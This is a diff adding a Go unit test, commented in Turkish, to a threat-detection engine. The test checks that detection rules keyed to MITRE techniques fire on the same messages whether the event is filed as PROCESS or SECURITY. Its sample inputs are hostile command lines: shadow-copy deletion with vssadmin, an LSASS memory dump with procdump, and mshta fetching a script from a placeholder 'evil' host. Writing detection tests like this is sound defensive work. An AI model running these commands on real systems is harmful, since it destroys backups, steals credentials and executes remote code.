@@ -294,6 +294,38 @@ func TestDefaultRulesNoFalsePositiveOnBenign(t *testing.T) {
 	}
 }
 
+// TestRegexRulesAreCategoryAgnostic, IOC-desen (MessageRegex) kurallarının olayın
+// KATEGORİSİNDEN BAĞIMSIZ tetiklendiğini doğrular. Aynı saldırgan deseni farklı
+// telemetri kaynaklarından farklı kategorilerle gelir: komut-satırı Windows 4688
+// (PROCESS), CreateRemoteThread Sysmon-8 (SECURITY), registry Sysmon-12/13 (SECURITY),
+// vssadmin/lsass 4688 (PROCESS). Kural kategoriye kilitli olsaydı bu olayları
+// "yanlış kapıdan" geldiklerinde kaçırırdı (yanlış-negatif). Her örüntüyü hem
+// PROCESS hem SECURITY kategorisinde deneriz; ikisinde de tetiklemeli.
+func TestRegexRulesAreCategoryAgnostic(t *testing.T) {
+	e := NewEngine(nil)
+	msgs := map[string]string{
+		"CreateRemoteThread hedef: explorer.exe (Sysmon 8 process injection)": "T1055",
+		"reg add HKLM\\Software\\X /v Y /t REG_SZ /d z /f":                    "T1112",
+		"vssadmin delete shadows /all /quiet":                                 "T1490",
+		"procdump -ma lsass.exe lsass.dmp":                                    "T1003",
+		"mshta.exe http://evil/x.hta":                                         "T1218",
+	}
+	for msg, wantTech := range msgs {
+		for _, cat := range []string{"PROCESS", "SECURITY"} {
+			dets := e.Evaluate(model.Event{Category: cat, Severity: "HIGH", Message: msg})
+			found := false
+			for _, d := range dets {
+				if d.Technique.ID == wantTech {
+					found = true
+				}
+			}
+			if !found {
+				t.Errorf("kategori %q, mesaj %q: %s beklenirdi (kategori-bağımsız olmalı), gelen %+v", cat, msg, wantTech, dets)
+			}
+		}
+	}
+}
+
 // TestAllRuleTechniquesInCatalog, her yerleşik kuralın tekniğinin mitre.Catalog()
 // içinde yer aldığını doğrular. Kapsam paneli (/api/mitre/coverage) YALNIZCA
 // katalogdaki teknikleri gösterdiğinden, kurala sahip olup katalogda olmayan bir
